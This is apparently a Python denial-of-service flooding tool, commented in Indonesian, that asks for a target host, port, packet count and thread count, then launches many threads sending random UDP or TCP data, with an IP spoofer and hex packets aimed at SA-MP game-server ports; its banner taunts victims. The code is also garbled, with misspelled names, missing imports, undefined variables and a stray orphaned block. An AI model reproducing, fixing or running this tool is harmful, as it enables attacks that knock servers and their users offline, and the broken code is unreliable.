#Author Coding Eclipse
#Remake Udp + Tcp Di Gabungin
#Kalo Mau Rename/Nyolong Pm Sama Ownernya Eclipse
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass
import datetime
import pharse

#Warna Untuk Tools
yellow='\033[93m'
green='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

def random_phrase():
    ppl = ["EXLIPSE#1334", "CYBER-EXLIPSE", "EXLIPSE#1334", "KING-EXLIPSE", "CODE-EXLIPSE", "AUTHOR-EXLIPSE", "STUDIO-EXLIPSE", "KILLER-EXLIPSE", "EXLIPSE#1334"]
    phrase = ["ada di sini", "melihatmu", "tahu namamu", "tahu lokasimu", "meretas NASA", "mengretas FBI", "meretas kamu", "mencari 4 kamu", "tepat di belakangmu ", "memiliki sensasi"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    print(f"""\033[93m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: V2.3 \t Author Code : EXLIPSE#1334\n\033[0m
    """)

password ="EXLIPSE"

for i in range(4):
	pwd = input(pink+b+"[E] Enter Password Tools [E]: "+b+pink)
	j=3
	if(pwd==password):
		time.sleep(2)
		print(yellow+b+"{E) Check Enter Your Password...."+b+yellow)
		break
	else:
		time.sleep(4)
		print(red+b+"{E} Password Yang Kamu Masukan Salah!!! "+b+red)
		continue
time.sleep(3)
print(green+b+"{E} Password Yang Kamu Masukan Benar!!!! \033[92m[√]\033[0m "+b+green)
time.sleep(2)
os.system("clear")



def banner():
    print(f"""\033[93m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: V2.3 \t Author Code : EXLIPSE#1334\n\033[0m
    """)

print(yellow+b+"{E} ===================================")
print(yellow+b+"{E} Author Code : Eclipse ") 
print(yellow+b+"{E}Dont Abuse And Dont Rename ") 
print(yelloe+b+"{E}Welcome My Tools")
print(yellow+b"{E} Thanks For Use My Tools Eclipse              ")
print(uellow+b+"{E} ===================================")
ip = str(input("  \033[0;31m[ Enter Target Host ]:"))
port = int(input(" \033[0;32m[ Enter Target Port ]:"))
choice = str(input(" \033[94m[ Enter Methods UDP-TCP ]: "))
times = int(input(" \033[0;31m[ Enter Attack Packet ]:"))
threads = int(input(" \033[0;32m[ Enter Attack Threads ]:"))
fake_ip = '182.21.20.32'
fake_ip = '144.76.38.22'
fake_ip = '113.218.77.15'
fake_ip = '128.111.31.1'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def Attack():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
			for x in range(times):
				s.sendto(data, bytes, addr)
			print(E +"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack2():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.sendto(data, bytes, addr)
			print(E +"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack3():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.sendto(data, bytes, addr)
			print(E +"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack4():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.sendto(data, bytes, addr)
			print(E +"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
			
def Attack5():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.sendto(data, bytes, addr)
			print(E +"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))

def Attack6():
	bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.sendto(data, bytes, addr)
			print(E +"\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))

def Attack7():
    bytes = random._radint(23100, 32100)
	data = random._urandom(577)
	E = random.choice(("[E]","[E]","[E]"))
	while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.sendto(data, bytes, addr)
			print(E +"\033[95m Sent Attack Host And Port %s \033[91m %s"%(ip,port))
		except:
			print("\033[91m Sent Attack Host And Port %s \033[91m %s"%(ip,port))

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))                
  
if __name__ == '__main__':
    try:
        for x in range(450):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

for y in range(threads):
	if choice == 'UDP-TCP':
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
else:
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack6)
		th.start()
		th = threading.Thread(target = Attack7)